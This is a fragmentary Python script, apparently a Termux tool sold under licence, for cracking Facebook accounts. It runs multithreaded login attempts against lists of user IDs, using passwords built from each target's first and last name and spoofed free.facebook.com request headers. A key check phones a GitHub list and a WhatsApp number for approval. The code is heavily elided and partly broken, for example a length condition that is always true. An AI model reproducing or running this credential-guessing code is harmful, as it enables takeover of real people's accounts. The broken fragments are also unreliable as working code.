...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                header = {
                    ...
                    "referer":"https://free.facebook.com/friends/center/mbasic/?fb_ref=tn&sr=1&eav=AfbZ27IapJ-6pAfH75mdRjMPZltQ1SAKtwuZf38si7BWoB8Qn4k1SFGEehuckAr7wM0&paipv=0&ref_component=mfreebasic_home_header&ref_page=MMessagingThreadlistController&refid=11&ref=wizard",
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with sarfrazssb(max_workers=30) as ssbworld:
                for zsb in self.id: # Yo Nau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
            ...
            with sarfrazssb(max_workers=60) as ssbworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        firsts = first.capitalize()
                        lasts = last.capitalize()
                        if len(xz) == 3 or len(xz) or len(xz) == 5 or len(xz) == 6:
                            pwx = [firstl+' '+lastl]
                        else:
                            pwx = [firstl+' '+lastl]
                            pwx = [firstl+' '+lastl]
...
def dupcutter():
	...
	print("[+] Emple : /sdcard/your_file_name.txt  \n\n")
...
try:
	...
	kok.write(myid+hacker)
	kok.close()
def xxx():
	key1=open('/data/data/com.termux/files/usr/bin/.mrhacker-cov', 'r').read()
	time.sleep(0.5)
	r1=requests.get("https://github.com/Sherazking310/smz/blob/main/App.txt").text
	if key1 in r1:
		clear()
		#lan()
		#zaain('\n\n\n\t\x1b[97m[\033[32;41mCONGRATULATION!!! YOUR KEY IS APPROVED ✅✅✅ \033[0;m]')
		os.system('clear')
		sarfraz()
	else:
		os.system("clear")
		...
		print("")
		print('\x1b[1;95m   PREMIUM TOOLS  NOT FOR FREE   ');time.sleep (0.03) 
		print('')
		print("   Your Key is Not Approved ")
		print("")
		print("\033[1;32     YOUR LICENSE KEY : "+Mr+zain+key1)
		print("")
		print("\033[1;33m   COPY YOUR LICENSE AND PRESS ENTER TO SEND TO THE ADMIN")
		print("")
		input(" Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20' +Mr+zain+key1
		os.system('am start https://wa.me/+2348167676589?text=' + tks) 
		xxx()
